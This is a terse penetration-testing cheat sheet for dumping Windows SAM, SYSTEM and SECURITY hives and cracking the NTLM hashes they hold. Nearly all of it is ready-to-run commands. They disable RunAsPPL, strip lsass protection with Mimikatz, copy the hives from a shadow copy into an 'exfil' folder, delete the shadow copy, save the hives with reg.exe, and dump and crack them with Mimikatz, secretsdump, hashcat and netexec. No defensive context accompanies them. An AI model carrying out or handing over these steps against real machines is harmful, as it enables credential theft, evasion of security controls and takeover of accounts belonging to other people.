# SAM Dump

```bash
SAM ( Security Account Manager )

# Path
C:\Windows\System32\config\SAM ( NTLM Hashes ) HKLM\SAM
C:\Windows\System32\config\SYSTEM ( Decrypted Function ) HKLM\SYSTEM
C:\Windows\System32\config\SECURITY ( Security Policy ) HKLM\SECURITY\Policy\Secrets


# Need Privileges:
  SeBackupPrivilege
  SeDebugPrivilege

# Disable RunAsPPL
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f

Mimikatz:
!+
!processprotect /process:lsass.exe /remove

# Shadow Copy
vssadmin list shadows ( List Available Shadows )

vssadmin create shadow /for=C:   -->   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
cmd /c mklink /d C:\shadow_drive \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

copy C:\shadow_drive\Windows\System32\config\SAM C:\exfil\SAM
copy C:\shadow_drive\Windows\System32\config\SYSTEM C:\exfil\SYSTEM
copy C:\shadow_drive\Windows\System32\config\SECURITY C:\exfil\SECURITY

vssadmin delete shadows /for=C: /quiet

# Reg 
Run as nt authority\system: psexec.exe -s -i cmd.exe
reg.exe save HKEY_LOCAL_MACHINE\SYSTEM C:\Temp\SYSTEM /y 
reg.exe save HKEY_LOCAL_MACHINE\SAM C:\Temp\SAM /y
reg.exe save HKEY_LOCAL_MACHINE\SECURITY C:\Temp\SECURITY /y

# Mimikatz
privilege::debug
token::elevate
lsadump::sam
lsadump::lsa /patch

# Hash Cracker
pip3 install impacket
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   User       RID            LMHASH                            NTLMHASH

hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# Hash Dump with netexec
netexec smb <IP> --local-auth -u <USER> -p <PASS> --lsa
netexec smb <IP> --local-auth -u <USER> -p <PASS> --sam
```
